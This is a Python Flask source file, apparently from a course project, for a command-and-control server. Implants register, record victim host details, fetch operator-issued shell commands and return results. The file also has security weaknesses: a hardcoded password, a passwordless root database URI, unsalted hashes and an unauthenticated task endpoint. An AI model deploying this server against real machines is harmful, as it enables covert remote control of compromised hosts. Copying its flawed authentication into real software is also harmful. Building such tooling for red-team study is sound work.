from flask import Flask , request, jsonify, redirect, render_template, url_for, session
import flask_login
from flask_login import LoginManager, login_required, login_user
from flask_sqlalchemy import SQLAlchemy ## inherently handles syncronization for us ##
from sqlalchemy import Column, Integer, String, ForeignKey, Table, false
import hashlib
import os
from functools import wraps



### some useful notes here ###
"""
sqlite:///:memory: (in-memory database)
sqlite:///relative_path/test.db (relatie path file-based database)
sqlite:////absolute_path/test.db (abs path file-based database)
"""
# -----------------------------




### configs ###
APP_KEY = os.environ["APP_KEY"]
password = "ch0nky" # a temperary password to test the server
localhost = "http://127.0.0.1:5000"
template_dir = "../client/templates"
app_secret_key = os.urandom(24)
# -----------------------------





### set up flask app ###

app = Flask(__name__, template_folder=template_dir) # use this to generate routes and handlers
app.secret_key = app_secret_key
login_manager = LoginManager()
login_manager.init_app(app)
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = True    # makes json output more readab;e

# set the database to work with flask ###

# app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_db.sqlite' # set the database to work with flask
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:@localhost/c2_server' #mysql://username:password@server/db
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False # Set to True if you want Flask-SQLAlchemy to track modifications of objects and emit signals
db = SQLAlchemy(app)

# -----------------------------


# 3 statuses for a task
CREATED = "CREATED"
TASKED = 'TASKED'
DONE = "DONE"

class Task(db.Model): # a SQLAlchemy class
    id = db.Column(db.Integer, primary_key=True) ## a database entity that allows us to index the entries
    # need to specify length of String if using MySQL; Feel free to change the length
    job_id = db.Column(db.String(288))
    agent_id = db.Column(db.String(288)) ## the agent that is associated with the task
    command_type = db.Column(db.String(288))
    cmd = db.Column(db.String(4096))
    job_status = db.Column(db.String(288))



class Client(db.Model, flask_login.UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(288))
    password = db.Column(db.String(288))
    # implants = db.relationship("Agent", backref='agent', lazy=True)


class Agent(db.Model): 
    id               = db.Column(db.Integer, primary_key = True)
    agent_id         = db.Column(db.String(288))
    password         = db.Column(db.String(288)) # secret key that verifies the agent with server
    computer_name    = db.Column(db.String(288)) # what computer did it connect from
    username         = db.Column(db.String(80)) # what user are you running as
    GUID             = db.Column(db.String(288)) # computer's GUID
    Integrity        = db.Column(db.String(288)) # what privileges do you have
    ip_address       = db.Column(db.String(32))  # what address did the implant connect from
    session_key      = db.Column(db.String(288)) # after you negotiated a session key, store it per agent
    sleep            = db.Column(db.Float)       # how often does the agent check in 
    jitter           = db.Column(db.Float)       # how random of a check in is it
    first_seen       = db.Column(db.DateTime)    # when did the agent first check in
    last_seen        = db.Column(db.DateTime)    # when was the last time you saw the agent
    expected_checkin = db.Column(db.DateTime)    # when should you expect to see the agent again
    #TODO            : a func to generate a new python datatime for expected checkin

# class Agent(db.Model): # a SQLAlchemy class
#     id = db.Column(db.Integer, primary_key=True)
#     agent_id = db.Column(db.String(288))
#     whoami = db.Column(db.String(288))
#     password = db.Column(db.String(288))

# search agent by agent_id
# link for ref: https://flask-sqlalchemy.palletsprojects.com/en/2.x/queries/
def find_agent_by_id(id_):
    """
        a function that finds an agent in database by its id
    """
    return Agent.query.filter_by(agent_id=id_).first()

def agent_exist(id_):
    """
        a function that checks if an agent exists
    """
    return find_agent_by_id(id_) != None

def find_client_by_id(id_):
    """
        a function that finds a client in database by its id
    """
    return Client.query.filter_by(client_id=id_).first()

def client_exist(id_):
    """
        a function that checks if a client exists
    """
    return find_client_by_id(id_) != None

def find_agent_task(agent_id):
    """
        a function that finds a task for an agent
    """
    return Task.query.filter_by(agent_id=agent_id, job_status= CREATED).first()

def find_task_by_jobID(job_id):
    """
        a function that finds a task by its job_id
    """
    return Task.query.filter_by(job_id=job_id).first()

def hash_passoword(password):
    """
        given a password as a string, return the hashed version
    """
    h = hashlib.sha256()
    h.update(password.encode(encoding='utf-8'))
    hex_password = h.hexdigest()
    return hex_password


def verify_agent_password(reg_agent_id, reg_password):
    """
        a function that verifies the password by comparing
        the hash stored in the database with the hash generated
    """
    hex_password = hash_passoword(reg_password)
    agent = find_agent_by_id(reg_agent_id)
    return agent.password == hex_password

def verify_client_password(reg_client_id, reg_password):
    """
        a function that verifies the password by comparing
        the hash stored in the database with the hash generated
    """
    hex_password = hash_passoword(reg_password)
    client = find_client_by_id(reg_client_id)
    return client.password == hex_password

def list_agents():
    """
        a function that returns a list of agents stored in database
    """
    agents = Agent.query.all()
    agent_ids = [i.agent_id for i in agents]
    return agent_ids

def list_clients():
    """
        a function that returns a list of clients stored in database
    """
    clients = Client.query.all()
    client_ids = [i.client_id for i in clients]
    return client_ids

def list_tasks():
    """
        a function that returns a list of tasks stored in database
    """
    tasks = Task.query.all()
    t = [{"agent_id":i.agent_id, "job_id": i.job_id, "job_status": i.job_status, "command_type": i.command_type, "cmd": i.cmd } for i in tasks]
    return t

def require_appkey(func):
    @wraps(func)
    def decorator(*args, **kwargs):
        if request.args.get('app_key') and request.args.get('app_key') == APP_KEY:
            return func(*args, **kwargs)
        else:
            print("[-] Missing AppKey or AppKey not match")
            return jsonify({"status": "authentication failed"})
    return decorator

@app.route('/agent/register', methods=["POST"]) # support only POST requests
def register_agent(): # --> this is a handler
    """
        listens to the /register_agent route
        and processes the registration request from agents
    """
    # request.json -> this will be how we are getting data from implant
    reg_data = request.json # storing registration data
    reg_password = reg_data["password"]
    reg_whoami = reg_data["whoami"]
    reg_agent_id = reg_data["agent_id"]

    agent = Agent(agent_id=reg_agent_id, username=reg_whoami, password=hash_passoword(reg_password))
    db.session.add(agent)
    db.session.commit() ## saves the data to the database

     #TODO: need to change this part so that password is properly verified
    if verify_agent_password(reg_agent_id, reg_password):
        print(f"[+] a new agent has successfully registered: {agent.agent_id}, {agent.username}")
    else:
        # print("[-] authentication failed")
        return jsonify({"status": "authentication failed"})

    return jsonify({"status": "ok", "message": "Welcome!"})

@app.route('/agent/send_task', methods=['POST'])
def send_task():
    """
        listens to the /task route
        When an implant asks for a new task, this function will query the database
        and see if the client has issued any task to that specific agent
        If so, return the task (a list of commands) in a json format
        If not, return an empty json (or something else)
    """
    data = request.json ## getting a request from task route
    if data == None:
        return jsonify({"status": "no data received from agent"})

    #TODO: need a better way to hide how the agent identifies itself
    agent_id = data["agent_id"] ## need to verify agent_id 
    password = data["password"] ## and password 
    if not agent_exist(agent_id):
        return jsonify({"status": "agent not found"})

    if verify_agent_password(agent_id, password):
        print(f"[+] agent {agent_id} has nothing to do. Give it a job!")
        task = find_agent_task(agent_id) ## find the task for the agent if there is any

        ### A DUMMY CMD FOR TESTING PURPOSES ###
        # task = {"command_type": "test_command", "cmd": ["whoami", "ping 8.8.8.8"], "status": CREATED} 
        ### COMMENT OUT WHEN TASK MUST BE READ FROM DB ###

        if task == None:
            return jsonify({})
        else:
            # update the status of task to TASKED
            task.job_status = TASKED
            db.session.commit()
            return jsonify({"job_id": task.job_id,"command_type": task.command_type, "cmd": task.cmd, "status": "ok"})
    else:
        print("[-] the agent has failed to authenticate")
        return jsonify({"status": "authentication failed"})
    
@app.route('/agent/get_results', methods=['POST'])
def get_results():
    """
        listens to the /task_results route
        When an implant sends back the results of a task, this function will store the results
        in the database
    """
    data = request.json
    if data == None:
        return jsonify({"status": "error: no data"})
    agent_id = data["agent_id"]
    password = data["password"]
    results = data["results"]
    job_id = data["job_id"]

    if verify_agent_password(agent_id, password):
        print(f"[+] agent {agent_id} has successfully completed the task# {job_id}")
        print(f"[+] here are the results: {results}")
        # agent = find_agent_by_id(agent_id)
        task = find_task_by_jobID(job_id)
        if task == None:
            return jsonify({"status": "task not found"})
        task.job_status = DONE
        db.session.commit()
        return jsonify({"status": "ok"})
    else:
        print("[-] the agent has failed to authenticate")
        return jsonify({"status": "authentication failed"})

# -----------------------------

@login_manager.user_loader
def load_user(user_id):
    """
       a required function for flask-login
    """
    if not client_exist:
        return None
    else:
        return find_client_by_id(user_id)

@app.route("/", methods=["GET"])
def login_page():
    return render_template("login.html")

@app.route('/client/login', methods=["GET","POST"])
@require_appkey
def login_client():
    """
        listens to the /register_client route
        and processes the registration request from clients
    """

    try:
        client_id = request.form.get('client_id')
        client_password = request.form.get('password')
        client = Client(client_id=client_id, password=hash_passoword(client_password))
        db.session.add(client)
        db.session.commit()
    except:
        print("[-] failed to get info from webpage")
        return render_template("unauthorized.html")

    #TODO: need to change this part so that password is properly verified
    if verify_client_password(client_id, client_password):
        print(f"[+] a new client has successfully registered: {client.client_id}")
        # flask.flash(f"Welcome {client.client_id}!")
        client = find_client_by_id(client_id)
        client.authenticated = True
        login_user(client) ## user loader function from flask-login

        return redirect(url_for("dashboard")) # redirect to the home page
    else:
        print("[-] authentication failed")
        return jsonify({"status": "authentication failed"})
    
    ## check userID and password
    ## if correct, grant access to home page
    
    return ""

@app.route('/client/dashboard', methods=['GET'])
@login_required
def dashboard():
    #TODO: display all the info needed
    """
        Listens to the /dashboard route
        This page should show all the agents & operators connected to the server
        
    """
    agent_list = list_agents() # a list of agents that are stored in the database
    client_list = list_clients() # a list of clients that are stored in the database
    task_list = list_tasks() # a list of tasks that are stored in the database
    info = jsonify({"agents": agent_list, 
                    "clients": client_list,
                    "tasks": task_list})
    
    return info

@app.route('/client/logout', methods=['GET'])
@login_required
def logout():
    pass


@app.route("/tasks/create", methods=["POST"])
def create_task():
    data = request.json
    if data == None:
        return jsonify({"status": "error: no data"})
    
    job_id       = os.urandom(16).hex() ##TODO: generate a random job id (might need to change this later)
    command_type = data["command_type"]
    cmd          = data["cmd"]
    agent_id     = data["agent_id"]

    ## error checking ##
    ##TODO: check if command type and cmd are valid

    if(not agent_exist(agent_id)):
        return jsonify({"status": "error: agent does not exist"})
    
    task = Task(
        command_type=command_type,
        cmd=cmd,
        job_status=CREATED,
        agent_id=agent_id,
        job_id=job_id
    )
    db.session.add(task)
    db.session.commit()
    print(f"[+] a new task has been created for agent {agent_id}")
    return jsonify({"status": "ok", "job_id": job_id})


if __name__ == '__main__':
    # HTTPS uses TLS (SSL) to encrypt normal HTTP requests and responses
    # app.run(ssl_context='adhoc') # run with TLS encryption 
    app.run()                      # run without TLS encryption










## Wayne's Notes ##
"""
    1. displaying message sent from backend to frontend

    In HTML:
    {% if message %}
        <h1>{{message}}!</h1>
    {% endif %}

    In Backend:
    return render_template('hello.html', message="Welcome!")

    2. receiving message from frontend to backend

    In HTML:
    <div id="song_content">
        <form method="post" action="{{ url_for('displaysearch') }}">
            <label for="song_title"></label>
            <input type="song_title" name="song_title" placeholder="Enter a song title here.." />
            <input type="submit" value="Search">
        </form>
    </div>

    In backend:
    @app.route("/displaysearch", methods=['POST'])
    def displaysearch():
        try:
            song = request.form.get('song_title') ## get input from webpage
        except:
            print("couldn't find all tokens")
            return render_template('song.html', message='error')

"""